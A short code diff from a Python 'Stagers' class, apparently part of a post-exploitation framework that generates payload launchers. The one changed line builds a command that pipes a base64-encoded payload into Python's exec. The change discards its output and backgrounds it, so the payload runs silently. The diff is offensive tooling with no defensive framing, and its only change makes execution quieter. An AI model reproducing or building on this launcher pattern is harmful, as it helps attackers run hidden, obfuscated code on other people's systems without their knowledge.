@@ -276,7 +276,7 @@ class Stagers:
         if encode:
             launchEncoded = base64.b64encode(launcherBase)
             # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
-            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &>/dev/null &" % (launchEncoded)
             return launcher
         else:
             return launcherBase
